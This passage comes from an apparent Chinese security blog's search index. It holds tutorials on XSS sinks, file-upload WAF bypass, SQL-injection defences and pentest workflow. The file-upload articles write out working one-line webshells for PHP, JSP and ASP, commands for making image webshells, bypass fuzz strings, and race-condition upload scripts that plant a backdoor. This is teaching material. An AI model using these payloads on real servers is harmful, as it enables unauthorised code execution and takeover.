document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname)","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"}]},{"title":"文件上传进阶-waf绕过及安全修复","slug":"文件上传进阶-waf绕过及安全修复","date":"2023-05-30T07:22:30.000Z","updated":"2023-05-30T07:22:30.000Z","comments":true,"path":"articles/2023/05/30/文件上传进阶-waf绕过及安全修复/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"","text":"上传参数名解析：明确哪些参数名可以修改 content-Disposition:一般可更改（form-data）接受表单的数据 name:表单参数值，不能更改 filename:文件名，可以更改 connect-Type：文件MIME，试情况而定 常见绕过方法 数据溢出-防止匹配（xxx...）也就是垃圾数据使得WAF无法匹配 Content-Disposition: form-data; **大量垃圾数据**; name=“upload_file” ; 大量垃圾数据; filename=&quot; xxxx&quot; 拦截继续，拦截就继续加。但是可能会上传失败，上传失败就不好用了 符号变异-防匹配（' &quot; ;）匹配''以及&quot;&quot;里面的内容，没匹配到，所以绕过 safedog匹配文件名的原则，应该是在“xxxx” ‘xxxx’ 双引号或单引号之间的。双引号在后面的时候，被安全狗拦截，说明匹配的是后面的双引号，(或者单引号),之前的文件名 数据截断-防匹配（%00 ; 换行） 换行后，安全狗匹配的就是 1234x.p\\nph\\npx.\\np\\nph\\npx\\n.\\np\\nph\\np\\nx\\n.\\np\\nph\\np 重复数据-防匹配（参数多次） 主要是绕过狗子，然后进行绕过 白名单概念 过滤filename中的值，就把数据包的一些数据名称（白名单概念）插入到其中 filename=&quot; Content-Disposition: form-data; name=“upload_file” ; x.php&quot; Content-Disposition： form-data； name=“upload_file” ; x.php 安全狗认为：当检测Filename的时候，由于递归关系，继续检测，因为x.php跟在了之前的Content-Disposition： form-data； name=&quot;upload_file&quot;的后面，而不是filename的值，所以他认为是无用数据，但是在数据包中x.php确实在“xxxxx” 双引号之间，所以会被成功上传。 怎么去学习绕过waf 因为WAF都是基于数据包检测的，所以你得知道WAF是怎么匹配我们的数据包的，就拿上面的例子来说。 大量脏数据：可能就是waf匹配机制只是匹配前多少多少字节，然后后面就不匹配了 ; filename等识别：看正则匹配的条件，也就是绕过正则，一般改动不会影响数据上传的话，就直接该（参考可以改什么） 只要清楚WAF的机制，那么我们学起来就会一通百通！ 再举个例子，如果waf是检测filename=&quot;&quot;的最后一个&quot;，那么，只要我们这样构造：filename=&quot;sss&quot;s.php他就不拦截了，会保存为s.php。 但是需要注意的是，你上传的必须都要是可以执行的php文件，因为解析漏洞可不是那么好找的！ 修复 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIME 检测：基于上传自带类型检测 内容检测：文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file(){} WAF 防护产品：宝塔，云盾，安全公司产品等 资源 字典 https://github.com/fuzzdb-project/fuzzdb https://github.com/TheKingOfDuck/fuzzDicts FUZZ 12345678filename=x.phpfilename=&quot;x.phpfilename=&#x27;x.phpfilename=&quot;a.jpg;.php&quot;;filename=&quot;a.php%00.jpg&quot;filename=&quot;connect-disposition:from-data;name=&quot;upload_file&quot;;x.php&quot;filename=&quot;x.jpg&quot;;filename=&quot;x.jpg&quot;;.....filename=&quot;x.php&quot;;","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"GBT-40855-2021——电动汽车远程服务与管理系统解读","slug":"GBT-40855-2021解读","date":"2023-05-30T03:26:16.000Z","updated":"2023-05-30T03:26:16.000Z","comments":true,"path":"articles/2023/05/30/GBT-40855-2021解读/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/GBT-40855-2021%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"对象 车载终端、车辆企业平台与公共平台间的数据通信。 测试要求与对象一般包括： 硬件/固件、软件系统、日志 网络端口传输、远程升级 数据存储 车载终端的安全需求 硬件： 不存在后门与隐蔽接口 调试接口应禁用或设置安全访问控制 平台间的安全需求 https://blog.csdn.net/ananas_orangey/article/details/119461914 https://www.cnblogs.com/tomyyyyy/p/17174932.html https://zhuanlan.kanxue.com/article-16906.htm https://supergate.top/2021/04/06/车联网安全测试入门总结/车联网安全测试入门总结/ https://www.ctfiot.com/23461.html https://www.eet-china.com/mp/a167077.html","categories":[{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"}],"tags":[{"name":"远程服务系统","slug":"远程服务系统","permalink":"https://j3f5.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/"}]},{"title":"SQL注入进阶-防御措施与代码级安全","slug":"SQL注入进阶-防御措施与代码级安全","date":"2023-05-30T03:16:46.000Z","updated":"2023-05-30T03:16:46.000Z","comments":true,"path":"articles/2023/05/30/SQL注入进阶-防御措施与代码级安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%BA%A7%E5%AE%89%E5%85%A8/","excerpt":"","text":"PHP 防御 对数据类型进行检查和转义/预编译 magic_quotes_gpc = On 预处理查询 (Prepared Statements) 使用prepared statements（预处理语句）和参数化的查询，可以有效的防止sql注入。 使用mysqli:prepare()实现。也是用?占位符实现 123$stmt = $dbConnection-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = ?&#x27;);$stmt-&gt;bind_param(&#x27;s&#x27;, $name); // &#x27;s&#x27; specifies the variable type =&gt; &#x27;string&#x27;$stmt-&gt;execute(); 使用pdo实现。默认情况下，PDO会使用DSN中指定的字符集对输入参数进行本地转义 12$stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = :name&#x27;);$stmt-&gt;execute([ &#x27;name&#x27; =&gt; $name ]); 隐藏错误信息 php.ini 中的 display_errors 选项，应该设为 display_errors = off。这样 php 脚本出错之后，不会在 web 页面输出错误，以免让攻击者分析出有作的信息。 调用 mysql_query 等 mysql 函数时，前面应该加上 @，即 @mysql_query(…)，这样 mysql 错误不会被输出。同理以免让攻击者分析出有用的信息 https://segmentfault.com/a/1190000008117968 JAVA JDBC 拼接不当造成SQL 注入 JDBC 有两种方法执行SQL 语句，分别为PrepareStatement 和Statement。两个方法的区别在于PrepareStatement 会对SQL 语句进行预编译，而Statement 方法在每次执行时都需要编译，会增大系统开销。 理论上PrepareStatement 的效率和安全性会比Statement 要好，但并不意味着使用PrepareStatement 就绝对安全，不会产生SQL注入。正确地使用PrepareStatement 可以有效避免SQL 注入的产生，使用 ? 作为占位符时，填入对应字段的值会进行严格的类型检查。将前面的“拼接构造SQL 语句”改为如下“使用占位符构造SQL 语句”的代码片段，即可有效避免SQL 注入的产生。 123456String sql = &quot;select * from user where id = &quot;+req.getParameter(&quot;id&quot;);out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);ResultSet rs = pstt.executeQuery();... 1234567PrintWriter out = resp.getWriter();String sql = &quot;select * from user where id = ?&quot;; //使用了占位符out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);pstt.setInt(1, Integer.parseInt(req.getParameter(&quot;id&quot;)));ResultSet rs = pstt.executeQuery(); 框架SQL注入 如今的 Java 项目或多或少会使用对 JDBC 进行更抽象封装的持久化框架，如 MyBatis 和 Hibernate。常见的框架SSH（Struts2+Spring+Hibernate）和SSM（Spring MVC+Spring+MyBatis）分别指的就是以上两个框架 MyBatis MyBatis 框架的思想是将SQL 语句编入配置文件中，避免SQL 语句在Java 程序中大量出现，方便后续对SQL 语句的修改与配置。 MyBatis中使用parameterType向SQL 语句传参，在SQL引用传参可以使用#&#123;Parameter&#125;和$&#123;Parameter&#125;两种方式。 #与$的区别 总的来说就是#是预编译，但是$不是。 使用#&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = ? //生成的语句 从Debug 回显的SQL语句执行过程可以看出，使用#&#123;Parameter&#125;方式会使用“?”占位进行预编译，因此此时不存在SQL 注入。 使用$&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = &#x27;z1ng&#x27; //生成的语句 从上面的演示可以看出，在底层构造完整SQL 语句时，MyBatis的两种传参方式所采取的方式不同。#{Parameter}采用预编译的方式构造SQL，避免了SQL 注入的产生。而$&#123;Parameter&#125;采用拼接的方式构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL 注入。 Hibernate Hibernate 框架是Java 持久化API（JPA）规范的一种实现方式。Hibernate将Java类映射到数据库表中，从 Java 数据类型映射到 SQL 数据类型。 其使用HQL作为语言与数据库进行交互，HQL的语法与SQL类似，但有些许不同。受语法的影响，HQL注入在实际漏洞利用上具有一定的限制。Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此HQL 查询语句由Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate 引擎 1234tx = session.beginTransaction();String parameter = &quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;;List user = session.createQuery(&quot;FROM User where name=&#x27;&quot;+parameter+&quot;&#x27;&quot;,User.class).getResultList();tx.commit(); 通过Debug 模式可以清晰地观察到变量“parameter”被拼接进语句中，并将原本的语义改变，查询出结果 12from Userwhere name = &#x27;zaaa&#x27;... 正确使用以下几种HQL 参数绑定的方式可以有效避免注入的产生: 位置参数（Positional parameter） 1... where name = ?1; query.setParameter(1, parameter); 命名参数（named parameter） 1String parameter = &quot;z1ng&quot; ; ... where name = :name&quot;; query.setParameter(&quot;name&quot;, parameter); 命名参数列表（named parameter list） 类实例（JavaBean） 防御不当（预编译CASE注入） SQL 注入最主要的成因在于未对用户输入进行严格的过滤，并采取不恰当的方式构造SQL 语句。在实际开发的过程中，有些地方难免需要使用拼接构造SQL 语句，例如SQL语句中order by 后面的参数无法使用预编译赋值。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。所以会存在 绕过： 通过case when语句可以将order by后的orderExpression表达式中添加select语句 即，即使参数化，但是还是会将注入代码重新写上去。 例子： 存在ORDER BY的请求：http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip 则可以构造这个，发起盲注，其中{0}是下标，{1}是ascii 1http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case when (select substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; from servers where hostname=&#x27;webgoat-prd&#x27;) then hostname else mac end 审计 代码审计的核心思想是追踪参数，而追踪参数的步骤就是程序执行的步骤。因此，代码审计是一个跟踪程序执行步骤的过程，了解了框架的执行流程自然会了解如何如跟踪一个参数，剩下的就是观察在参数传递的过程中有没有一些常见的漏洞点。 全局搜索 首先看pom.xml，看用了什么数据库和什么框架。 然后搜索query()函数，看哪里用到了，就大概看一下。 功能定点 我们可以从程序的具体功能上进行定点的漏洞挖掘，与数据库交互的位置就有可能出现SQL 注入，比如用户信息页面 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement （参数绑定）。 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;'&quot; +session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;; 存储过程防御 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"渗透测试基础","slug":"JAVA安全/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"渗透测试整体流程","slug":"渗透测试整体流程","date":"2023-05-29T14:53:16.000Z","updated":"2023-05-30T01:20:08.000Z","comments":true,"path":"articles/2023/05/29/渗透测试整体流程/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/","excerpt":"","text":"概述 明确目标 分析风险、获得授权 信息搜集 漏洞探测 漏洞验证 信息分析 利用漏洞 信息整理 形成报告 明确目标 确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权… 目标系统介绍、重点保护对象及特性。 是否允许数据破坏？ 是否允许阻断业务正常运行？ 测试之前是否应当知会相关部门接口人？ 接入方式？外网和内网？ 测试是发现问题就算成功，还是尽可能的发现多的问题？ 渗透过程是否需要考虑社会工程？ 确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？根据需求和自己技术能力来确定能不能做、能做多少 分析风险、获得授权 分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本…由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。 信息搜集 漏洞利用 利用上一步中列出的信息，使用相应的漏洞检测 方法：1）漏扫：AWVS、AppScan…2）结合漏洞去exploit-db等位置找利用3）在网上寻找验证POC 内容：系统漏洞：系统没有及时打补丁Websever漏洞：Websever配置问题Web应用漏洞：Web应用开发问题其它端口服务漏洞：各种21/8080(st2)/7001/22/3389通信安全：明文传输，token在cookie中传送等 漏洞验证 将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。 自动化验证：结合自动化扫描工具提供的结果 手工验证：根据公开资源进行验证 试验验证：自己搭建模拟环境进行验证 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用exploit-db/wooyun/渗透代码网站通用、缺省口令厂商的漏洞警告等 信息分析 为下一步实施渗透做准备 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击 绕过防御机制：是否有防火墙等设备，如何绕过 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀） 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 利用漏洞，获取数据 实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 目的：为了最后形成报告，形成测试结果使用。 形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告 补充介绍：要对漏洞成因，验证过程和带来危害进行分析 修补建议：当然要对所有产生的问题提出合理高效安全的解决办","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"}]},{"title":"文件上传基础","slug":"文件上传基础","date":"2023-05-29T02:29:28.000Z","updated":"2023-05-30T01:16:44.000Z","comments":true,"path":"articles/2023/05/29/文件上传基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件上传基础 利用思路 补充 一般上传代码 代码内容：其中 uploadfile 就是上传文件的实例，然后通过$_FILE来对文件信息进行读取，然后进行判断，是对应的！！！ 1234567891011&lt;?phpecho $_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;];echo $_FILE[&#x27;uploadfile&#x27;][&#x27;type&#x27;] != &quot;image/png&quot;;// 这个move...函数需要重点注意，是上传的重要函数move_uploaded_file($_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;], &#x27;../upload/&#x27;.$_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;]);?&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;uploadfile&quot;/&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; 文件上传漏洞如何查找及判断？ 黑盒查找。文件后台、会员中心、文件扫描。 一般可以通过url搜索上传界面 site：easyicon.net upload或inurl:upload.php 文件后台 进入网站后台不一定获得网站权限，可以从后台获取网站权限（后台拿webshell） 会员中心 通过图片上传 文件扫描 使用工具扫描出后台路径 白盒查找。通过代码分析到上传漏洞、查找文件上传功能。 对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。 注入点失败： 上传后没有返回路径（如果知道CMS类型那就好办） 上传失败 一句话木马 jsp：&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt; php：&lt;?php @eval($_POST[‘h4ck’]) ?&gt; asp：&lt;%eval request (“h4ck”)%&gt; aspx：&lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“h4ck”],“unsafe”);%&gt; 他们还有很多变体，但是都离不开命令执行函数。每种脚本的命令执行函数都有不少。其他的 图片马 jpg：图像以ff d8开头 gif：GIF89a 无敌，在前面加上这个就可以了！不需要什么图片啊啥的！ 然后再加上一句话木马。 也可以使用copy（需要在cmd下），即copy 1.png /b + shell.php /a webshell.jpg 整体思路 先扫目录，到什么会员中心找到上传漏洞点 筛选中间件看有没有解析漏洞 没有的话，进行注入&amp;&amp;绕过 不成功，就去看CMS版本和对应的漏洞 没有类似CMS漏洞，去找编辑器与最近的CVE漏洞 漏洞与绕过 JS前端绕过 关闭前端js即可 文件类型（黑名单绕过） 大小写/双写绕过 文件名：也就是后缀名。包括黑白名单等。 绕过：Php大小写、pphphp双写 其他特殊后缀绕过 .phtml .php5 上传函数绕过(./绕过) 上传函数：move_uploaded_file函数会忽略掉文件末尾的/. 绕过：可以构造save_path=1.php/.，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 空格、点绕过(windows) 当接收文件时，后台代码的限制条件中没有去除文件名首尾的空格(或是没有对.进行拆分)时，可以利用windows系统的命名规则进行绕过：如，将文件后缀改为xxx.php、xxx.php.、xxx.php . 在windows下xx.jpg[空格] 或xx.jpg.这两类文件是不允许存在的，若这样命名，windows会默认去除空格或点 还有些情况具体就需要看代码逻辑，比如如果代码只删除一次点且只去除一次首尾空格，在windows环境下就可以用xxx.php. .进行绕过 ::$DATA绕过(windows) ::$DATA绕过同样利用了windows的特性 NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 即在php+windows的环境下,如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名。 .htaccess绕过（详细见后） .user.ini绕过（详细见后） 解析漏洞绕过（详细见后） 文件检测（白名单） MIME content-type绕过 文件类型：MIME类型，MIME类型就是image/png之类的content-type 涉及函数mime_content_type MIME类型：image/png、audio/mpeg # mp3 %00截断（详细见后） 00截断绕过方式需要满足以下条件 1php版本小于5.3.4``php.ini的magic_quotes_gpc为OFF状态``使用move_uploaded_file函数且参数受用户控制 此时move_uploaded_file函数遇到0x00会截断 可以将上传文件后缀改为xx.php%00进行绕过 %0a绕过 %0a绕过方式需要满足以下条件 1Apache httpd 2.4.0至2.4.29``FileMatch正则匹配.php|.php5等后缀 该版本apache会通过$匹配后缀，而$匹配时会正则匹配某字符串结尾或以换行符结尾的一个字符串，即php[换行符]会被匹配成php 可以将上传文件后缀改为xx.php%0a进行绕过 其他 文件头绕过 文件头：内容头消息 涉及函数getimagesize和exif_imagetype函数。 文件头：gif: GIF89a、png: HEX 89 50 4E 47 0D 0A 1A 0A、jpg: HEX FF D8 FF 以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。 1copy safe.jpg /b + shell.php /a shell.jpg 在该场景下，防御姿势除了基本的黑/白名单外，还包括了对一些特定字符的限制，具体情况可以进行fuzz或者有条件可以进行代码审计 条件竞争/二次渲染绕过（详细见后） 内容逻辑数组绕过与目录命名 此部分将文件名分成3部分组成一个数组,例如将&quot;xx.jpg&quot;分为:“xx”、“.”、&quot;jpg&quot;三部分 其将文件名分为3个部分，分别检测并且拼接。我们可以改数组绕过 我们抓包将.php/.jpg分三部分修改即可绕过，此时第一部分为.php/，第二部分.，第三部分jpg，后面会拼接成：.php/.，因为上面的move_uploadfile会忽略./所以，上传成功。 00截断 00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。 所以：0x00，%00，/00都是可以的！ %00截断的条件 php版本要小于5.3.4 修改php.ini的magic_quotes_gpc为OFF状态（magic_quotes_gpc他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理） 上传路径是可以控制的 则修改路径 上面的12.php后面多了%00，造成了右边的截断，空格后面的全部都不要了。 需要注意的是，可能会对%00进行编码。 如何利用 注意，这里面有一个重命名，是我们可以控制的，所以我们可以抓包，然后在POST请求中修改road参数即可！ 修改之后变成： 报错，因为要.jpg为后缀，所以在文件名后面加上.jpg即可（全部都要修改）： 逻辑安全 二次渲染 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。 形式：判断图片格式后用imagecreatefromjpeg()函数进行二次渲染 绕过方式： 抓包找到二次渲染中未被改动的地方，将一句话马插入该地方，.jpg|.png|.gif三种文件格式不同，所以构造马的方式也不同 注：gif文件最简单，直接用ue等16进制编辑器就可以改，但是jpg和png需要特殊的构造脚本 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。将保存下来经过服务器二次渲染的那张jpg图片，用010编辑器与我们的图片马进行比对，看哪一些字节是被更改过的，在没有被更改的地方替换成我们的马重新上传。 用此脚本进行处理生成payload.jpg。然后再上传payload.jpg 条件竞争（先上传再校验） 一些网站上传文件的逻辑是先允许上传任意文件，然后检测上传文件的文件包是否合法（校验文件后缀、内容等），如果不合法则删除文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 造成漏洞的原因：先保存文件，再判断是否是允许的文件，如果不允许，则删除。 漏洞利用思路：上传一个写入木马的php文件backdoor.php，抓取数据包，对此数据包进行多线程高并发的重放。与此同时，用python不断的请求文件backdoor.php，由于多线程高并发的重放上传backdoor.php文件，所以一定会存在上传成功但还未来得及删除的backdoor.php文件使得python请求成功，一旦请求成功则会在本地写入木马。用菜刀连接即可getshell。 注意：这种条件竞争，即使你执行了一次，在那段时期内，这个不会被删（正在请求），但是一旦请求完毕，二次渲染完成，则该文件照样被删除！所以，请注意你的脚本是要 执行创建木马文件 的功能的。 123#backdoor.php#用来写入木马文件shell.php&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_PO[&quot;cmd&quot;])?&gt;&#x27;);?&gt; 1234567891011#requests_2.py#用来请求backdoor.phpimport requestsurl = &quot;http://ip/upload-labs/upload/backdoor.php&quot;url_2 = &quot;http://ip/upload-labs/upload/shell.php&quot;while True: html = requests.get(url) html_2 = requests.get(url_2) if html_2.status_code == 200: #判断shell.php是否写入成功 print(&quot;OK&quot;) break 先上传文件backdoor.php，抓取数据包发送到Inturder模块 高并发上传脚本： 1234567891011121314151617181920#upload.pyimport requestsfrom threading import Threadfile = &#123; #文件信息和文件 &quot;upload_file&quot;:open(&#x27;C:\\\\users\\\\xiamo\\\\desktop\\\\backdoor.php&#x27;), &quot;Content-Type&quot;:&quot;application/octet-stream&quot;, &quot;Content-Disposition&quot;:&quot;form-data&quot;, &quot;filename&quot;:&quot;backdoor.php&quot;&#125;url = &quot;http://192.168.1.120/upload-labs/Pass-17/index.php&quot;data = &#123; #参数 &quot;submit&quot;:&quot;上传&quot;&#125;def upload(): res = requests.post(url, files=file, data=data) print(res.status_code)while True: t = Thread(target=upload()) #创建线程 t.start() #开启线程 另外，使用inturder功能的步骤如下： 清除$$： 设置null payload： 设置多线程： 然后在浏览器中不停地访问那个上传的文件即可。 user.ini与.htaccess绕过 user.ini 利用范围 以fastcgi运行的php 首先得知道php.ini然后再去了解：.user.ini。它比.htaccess用的更广。.user.ini文件上传绕过和.htaccess文件上传绕过方式相似，都是上传一个攻击者自定义的配置文件导致服务器对图片文件的错误处理而导致的文件执行，但是.user.ini使用更加广泛，只要是以fastcgi运行的php都可以用这个方法，但是它的局限性在于上传的.user.ini文件目录必须存在可执行的php文件。 参考：https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html 简析 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 配置变量中有auto_prepend_file和auto_apend_file指定在文件前和文件尾包含文件。（这两个才是我们可以上传马的关键，指）如: 12auto_apend_file=01.gif # 指定一个文件，自动包含在要执行的文件前。auto_prepend_file=01.gif # 指定一个文件，自动包含在要执行的文件后。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 利用 新建一个文件名为.user.ini的文件，并将内容写为： 1auto_prepend_file=test.txt 将.user.ini上传至服务器 新建一个文件名为test.txt的文件，并将内容写为如下，或者写webshell马： 1&lt;?php phpinfo();?&gt; 再访问上传目录下的???.php，即可将test.txt内的内容脚本正常执行。 .htaccess 见apache解析漏洞绕过 解析漏洞 IIS解析漏洞 目录解析漏洞（/test.asp/1.jpg） 在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了。 文件名解析漏洞(test.asp;.jpg) 在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。 畸形解析漏洞(test.jpg/*.php) 微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5 在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php 